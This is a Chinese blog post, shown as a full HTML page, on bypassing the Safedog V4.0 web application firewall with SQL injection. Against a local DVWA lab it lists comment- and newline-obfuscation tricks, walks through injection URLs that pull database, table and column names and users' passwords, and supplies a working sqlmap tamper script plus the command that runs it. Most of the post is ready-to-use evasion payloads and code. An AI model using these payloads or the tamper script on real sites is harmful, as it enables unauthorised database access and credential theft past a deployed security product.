<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>网站安全狗V4.0绕过姿势 - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="网站安全狗V4.0绕过姿势" />
<meta property="og:description" content="网站安全狗下载地址：
网站安全狗-网站安全防护,防后门|防SQL注入|防CC攻击|网马查杀|防篡改https://www.safedog.cn/website_safedog.html
DVWA下载：
链接：https://pan.baidu.com/s/1XZXC3r_LhtY9s7xJM_NAYQ 提取码：kun6 --来自百度网盘超级会员V3的分享 已DVWA SQL注入为例对网站安全狗进行绕过测试。
1.查看安全狗防御规则匹配库。 2.绕过分析 字符
绕过方法
and
/*!14400and*/
order by
/**/order/*/%0a*a*/by/**/
union select
union/*!88888cas*//*/%0a*a*/select/**/
database()
database(/*%%!AJEST%%%%*/)
from information_schema.tables
/*!from--%0f/*%0ainformation_schema.tables*/
from information_schema.tables
/*!from--%0f/*%0ainformation_schema.columns*/
count(*)
count(1)
3.手工绕过 1.判断列数。 ?id=5&#39;/**/order/*/%0a*a*/by/**/1/**/--&#43; ?id=5&#39;/**/order/*/%0a*a*/by/**/2/**/--&#43; ?id=5&#39;/**/order/*/%0a*a*/by/**/3/**/--&#43; 2.判断显示位。 ?id=5&#39;/*//*/union/*!88888cas*//*/%0a*a*/select/*//*//*//*/1,2/*//*/--&#43; ?id=5&#39;/**//*!14400and*//**/1=2/*//*/union/*!88888cas*//*/%0a*a*/select/*//*//*//*/1,2/*//*/--&#43; 3.查询数据库名。 ?id=5&#39;/*!14400and*/1=2/*//*/union/*!88888cas*//*/%0a*a*/select/**//*//*/database(/*%%!AJEST%%%%*/),2/**/--&#43; 4.查询所有的表名。 ?id=5&#39;/*//*//*!14400and*//*//*/1=2/*//*/union/*!88888cas*//*/%0a*a*/select/**//*//*/table_name,2/*//*//*!from--%0f/*%0ainformation_schema.tables*//*//*/where table_schema=database(/*%%!AJEST%%%%*/)/**/--&#43; ?id=5&#39;/*//*//*!14400and*//*//*/1=2/*//*/union/*!88888cas*//*/%0a*a*/select/**//*//*/table_name,2/*//*//*!from--%0f/*%0ainformation_schema.tables*//*//*/where table_schema=database(/*%%!AJEST%%%%*/)/**/limit/*//*/0,1--&#43; ?id=5&#39;/*//*//*!14400and*//*//*/1=2/*//*/union/*!88888cas*//*/%0a*a*/select/**//*//*/group_concat(table_name),2/*//*//*!from--%0f/*%0ainformation_schema.tables*//*//*/where table_schema=database(/*%%!AJEST%%%%*/)/**/--&#43; 5.获取字段名字。 ?id=5&#39;/*//*//*!14400and*//*//*/1=2/*//*/union/*!88888cas*//*/%0a*a*/select/**//*//*/column_name,2/*//*//*!from--%0f/*%0ainformation_schema.columns*//*//*/where table_name=&#39;users&#39;/*//*//*!14400and*//*//*/table_schema=database(/*%%!AJEST%%%%*/)--&#43; ?id=5&#39;/*//*//*!14400and*//*//*/1=2/*//*/union/*!88888cas*//*/%0a*a*/select/**//*//*/column_name,2/*//*//*!from--%0f/*%0ainformation_schema.columns*//*//*/where table_name=&#39;users&#39;/*//*//*!14400and*//*//*/table_schema=database(/*%%!AJEST%%%%*/)/*//*//*!limit*//*//*/0,1/*//*/--&#43; ?id=5&#39;/*//*//*!14400and*//*//*/1=2/*//*/union/*!88888cas*//*/%0a*a*/select/**//*//*/column_name,2/*//*//*!from--%0f/*%0ainformation_schema.columns*//*//*/where table_name=&#39;users&#39;/*//*//*!14400and*//*//*/table_schema=database(/*%%!AJEST%%%%*/)--&#43; 6.获取字段内容。 ?id=5&#39;/*//*//*!14400and*//*//*/1=2/*//*/union/*!88888cas*//*/%0a*a*/select/**//*//*/user,password/*//*//*!from*//*//*/users --&#43; ?id=5&#39;/*//*//*!14400and*//*//*/1=2/*//*/union/*!88888cas*//*/%0a*a*/select/**//*//*/user,password/*//*//*!from*//*//*/users/*//*//*!limit*//*//*/0,1/*//*/ --&#43; 4.sqlmap编写tumper绕过 #!/usr/bin/env python &#34;&#34;&#34; Copyright (c) 2006-2019 sqlmap developers ([url]http://sqlmap.org/[/url]) See the file &#39;LICENSE&#39; for copying permission Author:LUSHUN &#34;" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/db2acd51978f0b6c560591d0d9f7bc3e/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-09-27T14:49:11+08:00" />
<meta property="article:modified_time" content="2021-09-27T14:49:11+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">网站安全狗V4.0绕过姿势</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <p><strong>网站安全狗下载地址：</strong></p> 
<p><a class="has-card" href="https://www.safedog.cn/website_safedog.html" rel="nofollow" title="网站安全狗-网站安全防护,防后门|防SQL注入|防CC攻击|网马查杀|防篡改"><span class="link-card-box"><span class="link-title">网站安全狗-网站安全防护,防后门|防SQL注入|防CC攻击|网马查杀|防篡改</span><span class="link-link"><img class="link-link-icon" src="https://images2.imgbox.com/0f/15/qFzZixNX_o.png" alt="icon-default.png?t=L892">https://www.safedog.cn/website_safedog.html</span></span></a></p> 
<p><strong>DVWA下载：</strong></p> 
<pre><code>链接：https://pan.baidu.com/s/1XZXC3r_LhtY9s7xJM_NAYQ 
提取码：kun6 
--来自百度网盘超级会员V3的分享</code></pre> 
<p>已DVWA SQL注入为例对网站安全狗进行绕过测试。</p> 
<h3>1.查看安全狗防御规则匹配库。</h3> 
<p><img alt="" height="552" src="https://images2.imgbox.com/1a/9f/2gdQjBzX_o.png" width="773"></p> 
<p><img alt="" height="582" src="https://images2.imgbox.com/1d/b0/4lFRut8t_o.png" width="776"></p> 
<p> <img alt="" height="550" src="https://images2.imgbox.com/53/14/OGw8VhDA_o.png" width="765"></p> 
<h3>2.绕过分析</h3> 
<p></p> 
<table><tbody><tr><td> <p id="u945f6fd3">字符</p> </td><td> <p id="ua4bcb3ad">绕过方法</p> </td></tr><tr><td> <p id="u5fa18d9b">and</p> </td><td> <p id="uc76da401"><code>/*!14400and*/</code></p> </td></tr><tr><td> <p id="u2e79c003">order by</p> </td><td> <p id="u464e35f6"><code>/**/order/*/%0a*a*/by/**/</code></p> </td></tr><tr><td> <p id="uaf8e3f4e">union select</p> </td><td> <p id="u10fe62ef"><code>union/*!88888cas*//*/%0a*a*/select/**/</code></p> </td></tr><tr><td> <p id="u76e29f52">database()</p> </td><td> <p id="u0379c805"><code>database(/*%%!AJEST%%%%*/)</code></p> </td></tr><tr><td> <p id="u9690a7e1">from information_schema.tables</p> </td><td> <p id="ud7ecf2b2"><code>/*!from--%0f/*%0ainformation_schema.tables*/</code></p> </td></tr><tr><td> <p id="ua4c6ff0f">from information_schema.tables</p> </td><td> <p id="u0ac3b124"><code>/*!from--%0f/*%0ainformation_schema.columns*/</code></p> </td></tr><tr><td> <p id="u4d782958">count(*)</p> </td><td> <p id="u92374e40">count(1)</p> </td></tr></tbody></table> 
<h3>3.手工绕过</h3> 
<pre><code class="language-sql">1.判断列数。
?id=5'/**/order/*/%0a*a*/by/**/1/**/--+
?id=5'/**/order/*/%0a*a*/by/**/2/**/--+
?id=5'/**/order/*/%0a*a*/by/**/3/**/--+
2.判断显示位。
?id=5'/*//*/union/*!88888cas*//*/%0a*a*/select/*//*//*//*/1,2/*//*/--+
?id=5'/**//*!14400and*//**/1=2/*//*/union/*!88888cas*//*/%0a*a*/select/*//*//*//*/1,2/*//*/--+
3.查询数据库名。
?id=5'/*!14400and*/1=2/*//*/union/*!88888cas*//*/%0a*a*/select/**//*//*/database(/*%%!AJEST%%%%*/),2/**/--+
4.查询所有的表名。
?id=5'/*//*//*!14400and*//*//*/1=2/*//*/union/*!88888cas*//*/%0a*a*/select/**//*//*/table_name,2/*//*//*!from--%0f/*%0ainformation_schema.tables*//*//*/where table_schema=database(/*%%!AJEST%%%%*/)/**/--+
?id=5'/*//*//*!14400and*//*//*/1=2/*//*/union/*!88888cas*//*/%0a*a*/select/**//*//*/table_name,2/*//*//*!from--%0f/*%0ainformation_schema.tables*//*//*/where table_schema=database(/*%%!AJEST%%%%*/)/**/limit/*//*/0,1--+
?id=5'/*//*//*!14400and*//*//*/1=2/*//*/union/*!88888cas*//*/%0a*a*/select/**//*//*/group_concat(table_name),2/*//*//*!from--%0f/*%0ainformation_schema.tables*//*//*/where table_schema=database(/*%%!AJEST%%%%*/)/**/--+
5.获取字段名字。
?id=5'/*//*//*!14400and*//*//*/1=2/*//*/union/*!88888cas*//*/%0a*a*/select/**//*//*/column_name,2/*//*//*!from--%0f/*%0ainformation_schema.columns*//*//*/where table_name='users'/*//*//*!14400and*//*//*/table_schema=database(/*%%!AJEST%%%%*/)--+
?id=5'/*//*//*!14400and*//*//*/1=2/*//*/union/*!88888cas*//*/%0a*a*/select/**//*//*/column_name,2/*//*//*!from--%0f/*%0ainformation_schema.columns*//*//*/where table_name='users'/*//*//*!14400and*//*//*/table_schema=database(/*%%!AJEST%%%%*/)/*//*//*!limit*//*//*/0,1/*//*/--+
?id=5'/*//*//*!14400and*//*//*/1=2/*//*/union/*!88888cas*//*/%0a*a*/select/**//*//*/column_name,2/*//*//*!from--%0f/*%0ainformation_schema.columns*//*//*/where table_name='users'/*//*//*!14400and*//*//*/table_schema=database(/*%%!AJEST%%%%*/)--+
6.获取字段内容。
?id=5'/*//*//*!14400and*//*//*/1=2/*//*/union/*!88888cas*//*/%0a*a*/select/**//*//*/user,password/*//*//*!from*//*//*/users --+
?id=5'/*//*//*!14400and*//*//*/1=2/*//*/union/*!88888cas*//*/%0a*a*/select/**//*//*/user,password/*//*//*!from*//*//*/users/*//*//*!limit*//*//*/0,1/*//*/ --+</code></pre> 
<p><img alt="" height="866" src="https://images2.imgbox.com/26/ec/RAPV65qI_o.png" width="1200"></p> 
<h3> 4.sqlmap编写tumper绕过</h3> 
<pre><code class="language-python">#!/usr/bin/env python
"""
Copyright (c) 2006-2019 sqlmap developers ([url]http://sqlmap.org/[/url])
See the file 'LICENSE' for copying permission
Author:LUSHUN
"""

import re
import os

from lib.core.data import kb
from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS

__priority__ = PRIORITY.LOW

def dependencies():
    singleTimeWarnMessage("Bypass safedog4.0'%s' only %s" % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))

def tamper(payload, **kwargs):
        payload=payload.replace('AND','/*!11440AND*/')
        payload=payload.replace('ORDER','order/*!77777cz*/')
        payload=payload.replace("SELECT","/*!11440SELECT*/")
        payload=payload.replace("SLEEP(","sleep/*!77777cz*/(")
        payload=payload.replace("UPDATEXML(","UPDATEXML/*!77777cz*/(")
        payload=payload.replace("SESSION_USER()","/*!11440SESSION_USER()*/")
        payload=payload.replace("USER())","USER/*!77777cz*/())")
        payload=payload.replace("DATABASE()","DATABASE/*!77777cz*/()")
        payload=payload.replace("ORDER BY","/**/order/*/%0a*a*/by/**/")
        payload=payload.replace("UNION","union/*!88888cas*/")
        payload=payload.replace("UNION","union/*!88888cas*/")
        payload=payload.replace("from information_schema.tables","/*!from--%0f/*%0ainformation_schema.tables*/")
        payload=payload.replace("from information_schema.columns","/*!from--%0f/*%0ainformation_schema.columns*/")
        payload=payload.replace("count(*)","count(1)")
        payload=payload.replace("as","/*!14400as*/")
        payload=payload.replace("char","/*!14400char*/")        
        return payload</code></pre> 
<pre><code class="language-bash">sqlmap -u "http://192.168.174.133/DVWA-master/vulnerabilities/sqli/?id=2&amp;Submit=Submit#" --cookie "security=low; security=low; PHPSESSID=hp0jf1elvpjdg8jdk08j4rik56" -p id --tamper "safedogbypass" --random-agent -v3 --dbs  --fresh-queries
</code></pre> 
<p><img alt="" height="571" src="https://images2.imgbox.com/df/2e/j1Sqa0mi_o.png" width="802"></p> 
<h3></h3>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/7762e2a2a4e8eb3704fbc6a47f023cf9/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">23种设计模式UML类图图解</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/82895a71c3fdc5d947096b01c4b4cec0/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">vue项目列表跳转详情返回列表页保留搜索条件</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>